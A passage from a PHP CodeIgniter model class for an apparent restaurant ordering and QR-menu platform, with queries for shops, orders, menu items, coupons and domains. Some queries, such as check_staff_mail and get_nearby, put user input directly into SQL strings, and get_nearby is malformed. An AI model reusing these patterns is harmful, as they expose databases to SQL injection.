	    $query = $this->db->get();
	    if($query->num_rows() > 0){
		    $query = $query->result_array();
		    return ['check'=>1,'result'=>$query];
		}else{
			return ['check'=>0];
		}
	}

	public function check_active_features($id,$slug){
		$this->db->select('uf.*,f.features as name,f.slug');
		$this->db->from('users_active_features uf');
		$this->db->join('features f','f.id=uf.feature_id','LEFT');
		$this->db->where('f.status',1);
		$this->db->where('uf.user_id',$id);
		$this->db->where('uf.status',1);
		$this->db->where('f.slug',$slug);
		$query = $this->db->get();
		if($query->num_rows() > 0){
			return ['check'=>1];
		}else{
			return ['check'=>0];
		}
	}

	public function get_time_using_id($id,$shop_id)
	{
		$this->db->select();
        $this->db->from('reservation_date');
        $this->db->where('days',$id);
        $this->db->where('shop_id',$shop_id);
		$query = $this->db->get();
		$query = $query->row_array();
		return $query;
	}

	public function get_all_by_shop_id($shop_id,$table)
    {
        $this->db->select();
        $this->db->from($table);
        $this->db->where('shop_id',$shop_id);
        $this->db->where('status',1);
        $query = $this->db->get();
        $query = $query->result_array();
        return $query;
    }


    public function get_all_by_shop_id_no_status($shop_id,$table)
    {
        $this->db->select();
        $this->db->from($table);
        $this->db->where('shop_id',$shop_id);
        $query = $this->db->get();
        $query = $query->result_array();
        return $query;
    }

    public function get_single_by_shop_id($shop_id,$table)
    {
        $this->db->select();
        $this->db->from($table);
        $this->db->where('shop_id',$shop_id);
        $this->db->where('status',1);
        $this->db->order_by('id','ASC');
        $query = $this->db->get();
        $query = $query->row_array();
        return $query;
    }

    


    public function check_order($shop_id,$uid)
    {
        $this->db->select();
        $this->db->from('order_user_list');
        $this->db->where('shop_id',$shop_id);
        $this->db->where('uid',$uid);
        $query = $this->db->get();
        if($query->num_rows() >0):
        	return ['check'=>1,'result'=>$query->row_array()];
        else:
        	return ['check'=>0,'result'=>[]];
        endif;
        
    }

    

    public function get_order_item($uid,$shop_id)
    {
		$this->db->select('oi.*');
        $this->db->select('i.id as items_id,i.title as name,i.thumb as item_thumb,i.cat_id,i.allergen_id,i.veg_type,i.price,a.name as allergen');
        $this->db->select('ip.package_name,ip.thumb as package_thumb,ip.final_price');
        $this->db->from('order_item_list oi');
        $this->db->join('items i','i.id = oi.item_id','LEFT');
        $this->db->join('allergens a','a.id = i.allergen_id','LEFT');
        $this->db->join('item_packages ip','ip.id = oi.package_id','LEFT');
        $this->db->where('oi.order_id',$uid);
        $this->db->where('oi.shop_id',$shop_id);
        $this->db->order_by('i.id','ASC');
        $query = $this->db->get();
         return $query->result_array();
        
    }

    public function get_order_type($uid,$shop_id)
    {
		$this->db->select('oi.*');
        $this->db->from('order_user_list oi');
        $this->db->where('oi.id',$uid);
        $this->db->where('oi.shop_id',$shop_id);
        $query = $this->db->get();
        return $query->row_array();
        
    }

    public function get_restaurant_info_by_id($id)
    {
        $this->db->select('rl.*,rl.id as shop_id,rl.name as shop_name,u.id as user_id,u.username,c.id as country_id,c.name as country_name');
        $this->db->from('restaurant_list rl');
        $this->db->join('users u','u.id=rl.user_id','LEFT');
        $this->db->join('country c','c.id=u.country','LEFT');
        $this->db->where('rl.id',$id);
        $query = $this->db->get();
        $query = $query->row_array();
        return $query;
    }

    public function shop_info($id)
    {
        $this->db->select('rl.*,rl.id as shop_id,rl.name as shop_name,u.id as user_id,u.username,c.id as country_id,c.name as country_name');
        $this->db->from('restaurant_list rl');
        $this->db->join('users u','u.id=rl.user_id','LEFT');
        $this->db->join('country c','c.id=u.country','LEFT');
        $this->db->where('rl.id',$id);
        $query = $this->db->get();
        $query = $query->row_array();
        return $query;
    }


    public function get_pickup_area($id)
    {
        $this->db->select('*');
        $this->db->from('pickup_points_area p');
        $this->db->where('p.shop_id',$id);
        $query = $this->db->get();
        $query = $query->result_array();
        return $query;
    }

     public function get_table_list($id)
    {
        $this->db->select('tl.*,ta.area_name,ta.id as table_area_id');
        $this->db->from('table_list tl');
        $this->db->join('table_areas ta','ta.id=tl.area_id','LEFT');
        $this->db->where('tl.shop_id',$id);
        $query = $this->db->get();
        $query = $query->result_array();
        return $query;
    }

    public function get_extras($item_id)
    {
        $this->db->select('ie.*');
        $this->db->from('item_extras ie');
        $this->db->where('ie.item_id',$item_id);
        $this->db->order_by('ie.id','ASC');
        $query = $this->db->get();
        $query = $query->result_array();
        return $query;
    }

    public function get_extras_name($id,$item_id)
    {
        $this->db->select('ie.*');
        $this->db->from('item_extras ie');
        $this->db->where('ie.id',$id);
        $this->db->where('ie.item_id',$item_id);
        $query = $this->db->get();
        $query = $query->row();
        return !empty($query->ex_name)?$query->ex_name:'';
    }

    public function get_single_qr_menu_by_id($id)
    {
        $this->db->select('ip.*,ip.id as package_id');
        $this->db->from('item_packages ip');
        $this->db->where('md5(ip.id)',$id);
        $this->db->order_by('id','ASC');
        $query = $this->db->get();
        $query = $query->result_array();
        foreach($query as $key => $value){
            $this->db->select('i.id as items_id,i.title,i.thumb as item_thumb,i.cat_id,i.allergen_id,i.veg_type,i.price as item_price,a.name as allergen,i.overview,i.img_url,i.img_type');
            $this->db->from('items i');
            $this->db->join('allergens a','a.id = i.allergen_id','LEFT');
            $this->db->where_in('i.id',json_decode($value['item_id']));
            $this->db->where('i.shop_id',$value['shop_id']);
            $this->db->where('i.status',1);
            $this->db->order_by('i.id','ASC');
            $query2 = $this->db->get();
            $query2 = $query2->result_array();
            $query[$key]['items'] = $query2;
        }

        return $query;
        
    }


    public function get_near_shop($ids)
    {
    	$this->db->select('l.*,r.username as shop_username,r.name as shop_name,r.thumb,r.slogan');
    	$this->db->from('shop_location_list l');
      $this->db->join('restaurant_list r','r.id = l.shop_id','LEFT');
    	$this->db->where_in('l.id',$ids);
    	$this->db->group_by('l.shop_id');
    	$query = $this->db->get();
    	$query = $query->result_array();
    	return $query;
    }


    public function get_delivery_area($id){
    	$this->db->select('da.*');
    	$this->db->from('delivery_area_list da');
    	$this->db->where('da.shop_id',$id);
    	$query = $this->db->get();
    	$query = $query->result_array();
    	return $query;
    }


    public function delivery_area_by_shop_id($id,$shop_id){
    	$this->db->select('da.*');
    	$this->db->from('delivery_area_list da');
    	$this->db->where('da.id',$id);
    	$this->db->where('da.shop_id',$shop_id);
    	$query = $this->db->get();
    	$query = $query->row_array();
    	return $query;
    }

    public function check_waiter_status($table,$shop_id){
    	$today = today();
    	$this->db->select('c.*');
    	$this->db->from('call_waiter_list c');
    	$this->db->where('c.is_ring',1);
    	$this->db->where('c.table_no',$table);
    	$this->db->where('c.shop_id',$shop_id);
    	$this->db->where("DATE_FORMAT(c.created_at,'%Y-%m-%d')", $today);
    	$query = $this->db->get();
    	if($query->num_rows() > 0){
    		return 1;
    	}else{
    		return 0;
    	}
    }

    public function count_table_shop_id($shop_id,$table)
    {
	    	$start_date = shop_info($shop_id)->start_date;
		    $end_date = shop_info($shop_id)->end_date;
		    
        $this->db->select('t.*,u.id,u.end_date,u.start_date,r.user_id');
		    $this->db->from($table. ' as t');
		    $this->db->join('restaurant_list r','r.id = t.shop_id','LEFT');
		    $this->db->join('users u','u.id = r.user_id','LEFT');
        $this->db->where('t.shop_id',$shop_id);
        $this->db->where("t.created_at BETWEEN '{$start_date}' AND '{$end_date}'");
        $query = $this->db->get();
        $query = $query->num_rows();
        return $query;
    }


    public function get_all_item_by_order_id($id)
    {
        $this->db->select('ol.*');
		    $this->db->from('order_item_list ol');
        $this->db->where('ol.order_id',$id);
        $query = $this->db->get();
        $query = $query->result_array();
        return $query;
    }

    public function get_all_order_item_by_order_id($id)
    {
        $this->db->select('ol.*,i.*,i.id as item_id');
		    $this->db->from('order_item_list ol');
		    $this->db->join('items i','i.id = ol.item_id','LEFT');
        $this->db->where('ol.order_id',$id);
        $query = $this->db->get();
        $query = $query->result_array();
        return $query;
    }

    public function get_my_hotel($shop_id)
    {
        $this->db->select('hl.*');
		    $this->db->from('hotel_list hl');
        $this->db->where('hl.shop_id',$shop_id);
        $this->db->where('hl.status',1);
        $query = $this->db->get();
        $query = $query->result_array();
        return $query;
    }


    public function check_pin($shop_id,$pin_number)
    {
        $this->db->select('ol.*');
		    $this->db->from('restaurant_list ol');
        $this->db->where('ol.id',$shop_id);
        $this->db->where('ol.pin_number',$pin_number);
        $query = $this->db->get();
        if($query->num_rows() > 0){
        	 return 1;
        }else{
        		 return 0;
        }
       
    }

    public function get_my_coupons($shop_id)
    {
    	$today = today();
    	$this->db->select('c.*');
    	$this->db->from('coupon_list as c');
    	$this->db->where('c.user_id', $shop_id);
    	$this->db->where('c.start_date <=', $today);
    	$this->db->where('c.end_date >=', $today);
    	$this->db->where('c.status',1);
    	$query = $this->db->get();
    	$query = $query->result_array();
    	return $query;
    }  


     public function check_latest_order($shop_id,$order_type,$email,$phone,$customer_id)
    {

   
    	$today = today();
    	$sql = "email = {$email} OR phone = '{$phone}'";
    	$this->db->select('o.*');
    	$this->db->from('order_user_list as o');
    	if(isset($customer_id) && $customer_id!=0):
    		$this->db->where('o.customer_id',$customer_id);
    	else:	
    		if(!empty($email)){
    			$this->db->where('email',$email);
    		}

    		if(!empty($phone)){
    			$this->db->where('phone',$phone);
    		}

    	endif;
    	
    	

    	$this->db->where('o.shop_id',$shop_id);
    	$this->db->where('o.order_type',$order_type);
    	$this->db->where("DATE_FORMAT(o.created_at,'%Y-%m-%d')",$today);
    	$this->db->where_in('o.status',[0,1]);
    	$this->db->order_by('o.id','DESC');
    	$query = $this->db->get();
    	$query = $query->row();
    	return $query;
    }  

    public function find_subscribers($user_id,$shop_id)
    {
    	$this->db->select('ol.*');
    	$this->db->from('subscriber_list ol');
    	$this->db->where('ol.shop_id',$shop_id);
    	$this->db->where('ol.user_id',$user_id);
    	$query = $this->db->get();
    	if($query->num_rows() > 0){
    		return 1;
    	}else{
    		return 0;
    	}

    }

    public function check_staff_mail($email)
    {
    	$this->db->select('st.*');
    	$this->db->from('staff_list st');
    	$this->db->where("(st.email = '$email')");
    	$this->db->where("st.role",'staff');
    	$query = $this->db->get();
    	if($query->num_rows() > 0){
    		return 1;
    	}else{
    		return 0;
    	}

    }


    public function get_requested_username($subdomain,$domain)
    {
    	$this->db->select('cl.*');
    	$this->db->from('custom_domain_list cl');
    	$this->db->where('cl.request_name',$subdomain);
    	$this->db->or_where('cl.request_name',$domain);
    	$query = $this->db->get();
    	if($query->num_rows() > 0){
    		return $query->row();
    	}else{
    		return [];
    	}

    } 


    public function get_domain_info($username)
    {
    	$this->db->select('cl.*');
    	$this->db->from('custom_domain_list cl');
    	$this->db->where('cl.username',$username);
    	$this->db->where('cl.is_ready',1);
    	$query = $this->db->get();
    	if($query->num_rows() > 0){
    		return $query->row();
    	}else{
    		return [];
    	}

    }


    public function is_order()
    {
    	if(method_exists($this->db,'is_order')):
    		$db_connect = @$this->db->is_order();
    		return $db_connect;
    	endif;
    	
    }


    public function clear_auth_data(){
			$sess = ['is_merge','is_table','table_no','payment','qr_order','order_info','is_pos','is_order_edit'];
			$merge_array = array_intersect(array_keys($this->session->userdata()), $sess);
			$this->session->unset_userdata($merge_array);
		}


    public function get_nearby($latitude,$longitude)
    {

    	$radius_km = 5; 
    	$sql_distance = " ,(((acos(sin((".$latitude."*pi()/180)) * sin((`p`.`latitude`*pi()/180))+cos((".$latitude."*pi()/180)) * cos((`p`.`latitude`*pi()/180)) * cos(((".$longitude."-`p`.`longitude`)*pi()/180))))*180/pi())*60*1.1515*1.609344) as distance "; 

    	$having = " HAVING (distance <= $radius_km) "; 

    // 	$order_by = ' distance ASC '; 
    // }else{ 
    	
    // } 
 			$order_by = ' p.id DESC '; 
				// Fetch places from the database 
						// $sql = "SELECT p.*".$sql_distance." FROM places p $having ORDER BY $order_by"; 
				// $query = $db->query($sql); 


    	$this->db->select("SELECT p.*".$sql_distance." FROM restaurant_list p $having ORDER BY $order_by");
    	$query = $this->db->get();
    	if($query->num_rows() > 0){
    		return 1;
    	}else{
    		return 0;
    	}

    }

  public function get_my_categories($user_id,$language=null,$limit=0)
  {
  	$shop_id = restaurant($user_id)->id;
  	$this->db->select('mt.*');
  	$this->db->from('menu_type mt');
  	$this->db->join('item_category_list ic','ic.id=mt.category_id','LEFT');
  	$this->db->where('ic.shop_id',$shop_id);
  	$this->db->where('mt.user_id',$user_id);
  	$this->db->where('mt.language',$this->site_lang);
  	
  	if($limit !=0){
  		$this->db->limit($limit); 
  	}
  	$this->db->order_by('mt.orders',"ASC");
  	$query = $this->db->get();
  	$query = $query->result_array();
  	foreach ($query as $key => $value) {
  		$this->db->select('i.*');
  		$this->db->from('items i');
  		$this->db->where('i.cat_id',$value['category_id']);
  		$this->db->where('i.status',1);

  		$this->db->where('i.language',$this->site_lang);
  		$this->db->order_by('i.orders','ASC');
  		$query2 = $this->db->get();
  		$query2 = $query2->num_rows();
  		$query[$key]['total_item'] = $query2;
  	}
  	return $query;

  }

  public function get_cat_info_by_id_ln($user_id,$cat_id)
  {

  	$this->db->select('mi.*');
  	$this->db->from('menu_type mi');
  	$this->db->where('md5(mi.category_id)',$cat_id);
  	$this->db->where('mi.user_id',$user_id);
  	$this->db->where('mi.status',1);
  	$this->db->where('mi.language',$this->site_lang);
  	$this->db->order_by('mi.id','ASC');
  	$query = $this->db->get();
  	$query = $query->row_array();
  	return $query;

  }


}
